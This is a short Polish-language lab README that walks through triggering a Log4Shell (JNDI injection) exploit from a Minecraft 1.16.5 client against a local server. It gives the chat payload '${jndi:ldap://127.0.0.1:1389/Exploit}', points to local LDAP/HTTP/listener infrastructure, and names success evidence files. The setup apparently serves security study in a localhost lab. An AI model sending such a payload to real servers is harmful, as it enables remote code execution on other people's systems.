# Trigger z klienta Minecraft

1. `./scripts/start-mc-server.sh` → `127.0.0.1:25565`, wersja **1.16.5**, offline.
2. Klient 1.16.5 (np. Prism), konto offline.
3. Połączenie: `127.0.0.1:25565`.
4. Uruchomiona infrastruktura ataku (LDAP/HTTP/listener) albo wcześniejszy
   `run-full-lab` bez `stop`.
5. Na czacie: `${jndi:ldap://127.0.0.1:1389/Exploit}`
6. Sukces: `evidence/pwned.txt`, wpis w `run/listener.log`.

Bez GUI: `./scripts/run-vulnerable.sh`.
